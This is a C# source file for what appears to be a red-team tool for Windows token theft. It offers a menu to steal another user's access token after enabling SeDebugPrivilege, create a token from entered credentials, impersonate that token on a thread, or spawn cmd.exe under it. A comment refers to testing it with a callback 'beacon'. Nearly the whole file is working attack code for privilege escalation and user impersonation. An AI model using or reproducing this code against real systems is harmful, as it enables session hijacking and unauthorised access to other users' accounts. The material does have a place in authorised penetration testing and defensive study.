using System;
using System.Security.Principal;
using System.Diagnostics;
using System.Security;
using System.Runtime.InteropServices;

namespace TokenContext
{
    class Program
    {
        static void Main(string[] args)
        {
            int decision = displayMenu();
            IntPtr token = IntPtr.Zero;
            IntPtr duplicateToken = IntPtr.Zero;
            const int SecurityImpersonate = 2;


            if (decision == 2)
            {
                makeToken(ref token, SecurityImpersonate, ref duplicateToken);
                launchProcess(token);
            }
            else if (decision == 1)
            {
                stealToken(ref token, SecurityImpersonate, ref duplicateToken);
            }
            else if (decision == 3)
            {
                //Need to test launch process with beacon or some other type of executable that calls back.
                stealToken(ref token, SecurityImpersonate, ref duplicateToken);
                WindowsIdentity impersonatedUser = new WindowsIdentity(duplicateToken);
                launchProcess(duplicateToken);
            }
            else if (decision == 4)
            {
                rev2self();
            }
            else if (decision == 5)
            {
                stealToken(ref token, SecurityImpersonate, ref duplicateToken);
                IntPtr hproc = Process.GetCurrentProcess().Handle;
                Console.WriteLine(hproc.ToString());
                try
                {
                    Console.WriteLine("Before User: {0}", Environment.UserName);

                    if(WindowsAPIHelper.SetThreadToken(IntPtr.Zero, duplicateToken))
                    {
                        Console.WriteLine("After User: {0}", Environment.UserName);
                    }
                    else
                    {
                        Console.WriteLine("Failed, Error Code: {0}",Marshal.GetLastWin32Error().ToString());
                   
                    }
                    Console.WriteLine("Reverting...");
                    Console.WriteLine("Current User: {0}", Environment.UserName);
                    WindowsAPIHelper.RevertToSelf();
                    Console.WriteLine("After: {0}", Environment.UserName);
                }
                catch
                {
                    Console.WriteLine(Marshal.GetLastWin32Error().ToString());
                }
                Process.Start("cmd.exe", "");

            }
            else
            {
                Console.WriteLine("Womp");
            }
            Console.ReadLine();
        }

        static int displayMenu()
        {
            int decision = 0;

            while(!(decision == 1 || decision == 2 || decision == 3 || decision == 4 || decision == 5))
            {
                Console.Clear();
                Console.WriteLine("What would you like to do? (Select Number)\n1.) Steal a token from a currently logged in user.\n2.) Generate a new token using credentials.\n3.) Steal a token and launch a new process.\n4.) Revert To Self\n5.) Steal a token and set thread context.");
                int.TryParse(Console.ReadLine(), out decision).ToString();
            }
            return decision;
            
        }
        static void launchProcess(IntPtr duplicateToken)
        {
            //Run commands using that tokens Impersonation Context.
            WindowsAPIHelper.PROCESS_INFORMATION pi = new WindowsAPIHelper.PROCESS_INFORMATION();
            WindowsAPIHelper.STARTUPINFO si = new WindowsAPIHelper.STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            string process = @"C:\Windows\System32\cmd.exe";
            Console.WriteLine("Launching Process: {0}", process);
            if (WindowsAPIHelper.CreateProcessWithTokenW(duplicateToken, WindowsAPIHelper.LogonFlags.LOGON_NETCREDENTIALS_ONLY, process, null, WindowsAPIHelper.CreationFlags.CREATE_DEFAULT_ERROR_MODE, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("Process Launched");
            }
            else
            {
                Console.WriteLine("Failed to launch process: {0}", Marshal.GetLastWin32Error().ToString());
            }
        }
        static void stealToken(ref IntPtr token, int SecurityImpersonate, ref IntPtr duplicateToken)
        {
            //Check for Debugging
            Console.WriteLine("Current User: {0}", WindowsIdentity.GetCurrent().Name);
            IntPtr hToken = enableSEDebugPrivilege();
            IntPtr hHandle = attachProcess();
            WindowsAPIHelper.OpenProcessToken(hHandle, (uint)WindowsAPIHelper.DesiredAccess.TOKEN_MAXIMUM_ALLOWED, out token);
            WindowsAPIHelper.SECURITY_ATTRIBUTES sa = new WindowsAPIHelper.SECURITY_ATTRIBUTES();



            Console.WriteLine("Stealing token...");
            //Token Type needs to be Primary if launching a new process, Impersonation if changing ThreadToken (Possibly? How true is this?)
            if (WindowsAPIHelper.DuplicateTokenEx(token, (uint)WindowsAPIHelper.DesiredAccess.TOKEN_MAXIMUM_ALLOWED, ref sa, WindowsAPIHelper.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, WindowsAPIHelper.TOKEN_TYPE.TokenImpersonation, out duplicateToken))
            {
                if(duplicateToken == IntPtr.Zero)
                {
                    Console.WriteLine("Failed");
                    return;
                }
                WindowsIdentity impersonatedUser = new WindowsIdentity(duplicateToken);

                //Run commands using that tokens Impersonation Context.
                using (WindowsImpersonationContext ImpersonationContext = impersonatedUser.Impersonate())
                {
                    if (ImpersonationContext != null)
                    {
                        Console.WriteLine("After Impersonation Succeeded!\nUser: {0}\nSID: {1}", WindowsIdentity.GetCurrent(TokenAccessLevels.MaximumAllowed).Name, WindowsIdentity.GetCurrent(TokenAccessLevels.MaximumAllowed).User.Value);
                    }
                }
            }
            else
            {
                Console.WriteLine("Unable to duplicate token!");
                return;
            }
        }
        private static IntPtr attachProcess()
        {
            Console.Clear();
            Process[] processes = Process.GetProcesses();
            var procName = "list";
            Console.WriteLine("Enter the ID of the process you want to impersonate.");
            procName = Console.ReadLine();
            Process targetProcess = null;
            try
            {
                targetProcess = Process.GetProcessById(int.Parse(procName));
                Console.WriteLine("Successfully Connected to process ID {0} - {1}", targetProcess.Id, targetProcess.ProcessName);
            }
            catch
            {
                Console.WriteLine("Failed to find process with ID: {0}", procName);
            }
            //Open a handle to the process
            IntPtr ptr = WindowsAPIHelper.OpenProcess(WindowsAPIHelper.ProcessAccessFlags.All, false, targetProcess.Id);
            if (ptr == IntPtr.Zero) { Console.WriteLine("OpenProcess Failed!"); } else { Console.WriteLine("OpenProcess Succeeded: " + ptr.ToInt32().ToString()); }
            return ptr;
        }
        static void makeToken(ref IntPtr token, int SecurityImpersonate, ref IntPtr duplicateToken)
        {
            Console.WriteLine("Current User: {0}", WindowsIdentity.GetCurrent().Name);
            Console.Write("Enter the user you want to impersonate: ");
            string username = Console.ReadLine();
            Console.Write("Enter the password for the user you want to impersonate: ");
            SecureString password = GetPassword();
            Console.WriteLine();


            //Logon the user to get a context handle
            if(WindowsAPIHelper.LogonUser(username,Environment.MachineName,ConvertToUnsecureString(password),(int)WindowsAPIHelper.Logon32Type.Interactive,(int)WindowsAPIHelper.Logon32Provider.Default,ref token)!=0)
            {
                WindowsAPIHelper.SECURITY_ATTRIBUTES sa = new WindowsAPIHelper.SECURITY_ATTRIBUTES();
                //Duplicate the token stolen from the logon.
                //Nee to update this to DuplicateTokenEx
                if (WindowsAPIHelper.DuplicateTokenEx(token, (uint)WindowsAPIHelper.DesiredAccess.TOKEN_MAXIMUM_ALLOWED, ref sa, WindowsAPIHelper.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, WindowsAPIHelper.TOKEN_TYPE.TokenPrimary, out duplicateToken))
                {
                    WindowsIdentity impersonatedUser = new WindowsIdentity(duplicateToken);

                    //Run commands using that tokens Impersonation Context.
                    using (WindowsImpersonationContext ImpersonationContext = impersonatedUser.Impersonate())
                    {
                        if(ImpersonationContext != null)
                        {
                            Console.WriteLine("After Impersonation Succeeded!\nUser: {0}\nSID: {1}", WindowsIdentity.GetCurrent(TokenAccessLevels.MaximumAllowed).Name, WindowsIdentity.GetCurrent(TokenAccessLevels.MaximumAllowed).User.Value);
                        }
                    }
                }
                else
                {
                    Console.WriteLine("Unable to duplicate token!");
                    return;
                }
            }
            else
            {
                Console.WriteLine("LogonUser failed! Are the credentials correct?");
                return;
            }
        }
        static void rev2self()
        {

        }
        static string ConvertToUnsecureString(SecureString securePassword)
        {
            if (securePassword == null)
                throw new ArgumentNullException("securePassword");

            IntPtr unmanagedString = IntPtr.Zero;
            try
            {
                unmanagedString = Marshal.SecureStringToGlobalAllocUnicode(securePassword);
                return Marshal.PtrToStringUni(unmanagedString);
            }
            finally
            {
                Marshal.ZeroFreeGlobalAllocUnicode(unmanagedString);
            }
        }
        public static SecureString GetPassword()
        {
            SecureString pass = new SecureString();
            while (true)
            {
                ConsoleKeyInfo i = Console.ReadKey(true);
                if (i.Key == ConsoleKey.Enter)
                {
                    break;
                }
                else if (i.Key == ConsoleKey.Backspace)
                {
                    if (pass.Length > 0)
                    {
                        pass.RemoveAt(pass.Length - 1);
                        Console.Write("\b \b");
                    }
                }
                else
                {
                    pass.AppendChar(i.KeyChar);
                    Console.Write("*");
                }
            }
            return pass;
        }
        private static IntPtr enableSEDebugPrivilege()
        {
            IntPtr hToken = IntPtr.Zero;
            WindowsAPIHelper.LUID luidSEDebugNameValue;
            WindowsAPIHelper.TOKEN_PRIVILEGES tkpPrivileges;

            if (!WindowsAPIHelper.OpenProcessToken(WindowsAPIHelper.GetCurrentProcess(), (uint)WindowsAPIHelper.DesiredAccess.TOKEN_ADJUST_PRIVILEGES | (uint)WindowsAPIHelper.DesiredAccess.TOKEN_QUERY, out hToken))
            {
                Console.WriteLine("OpenProcessToken() failed, error = {0} . SeDebugPrivilege is not available", Marshal.GetLastWin32Error());
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("OpenProcessToken() successfully");
            }

            if (!WindowsAPIHelper.LookupPrivilegeValue(null, WindowsAPIHelper.PrivilegeName.SE_DEBUG_NAME, out luidSEDebugNameValue))
            {
                Console.WriteLine("LookupPrivilegeValue() failed, error = {0} .SeDebugPrivilege is not available", Marshal.GetLastWin32Error());
                WindowsAPIHelper.CloseHandle(hToken);
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("LookupPrivilegeValue() successfully");
            }

            tkpPrivileges.PrivilegeCount = 1;
            tkpPrivileges.Luid = luidSEDebugNameValue;
            tkpPrivileges.Attributes = WindowsAPIHelper.PrivilegeName.SE_PRIVILEGE_ENABLED;

            if (!WindowsAPIHelper.AdjustTokenPrivileges(hToken, false, ref tkpPrivileges, 0, IntPtr.Zero, IntPtr.Zero))
            {
                Console.WriteLine("LookupPrivilegeValue() failed, error = {0} .SeDebugPrivilege is not available", Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("SeDebugPrivilege is now available");
            }
            return hToken;

        }
        private static IntPtr EnableAssignPrimaryTokenValue(IntPtr hToken)
        {
            WindowsAPIHelper.LUID luidSEAssignPrimaryTokenValue;
            WindowsAPIHelper.TOKEN_PRIVILEGES tkpPrivileges;
            if (!WindowsAPIHelper.LookupPrivilegeValue(null, WindowsAPIHelper.PrivilegeName.SE_ASSIGNPRIMARYTOKEN_NAME, out luidSEAssignPrimaryTokenValue))
            {
                Console.WriteLine("LookupPrivilegeValue() failed, error = {0} .SeAssignPrimaryToken is not available", Marshal.GetLastWin32Error());
                WindowsAPIHelper.CloseHandle(hToken);
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("LookupPrivilegeValue() successfully");
            }


            tkpPrivileges.PrivilegeCount = 1;
            tkpPrivileges.Luid = luidSEAssignPrimaryTokenValue;
            tkpPrivileges.Attributes = WindowsAPIHelper.PrivilegeName.SE_PRIVILEGE_ENABLED;

            if (!WindowsAPIHelper.AdjustTokenPrivileges(hToken, false, ref tkpPrivileges, 0, IntPtr.Zero, IntPtr.Zero))
            {
                Console.WriteLine("LookupPrivilegeValue() failed, error = {0} .Se Assign Primary Token is not available", Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("Se Assign Primary Token is now available");
            }
            return hToken;
        }
    }
}
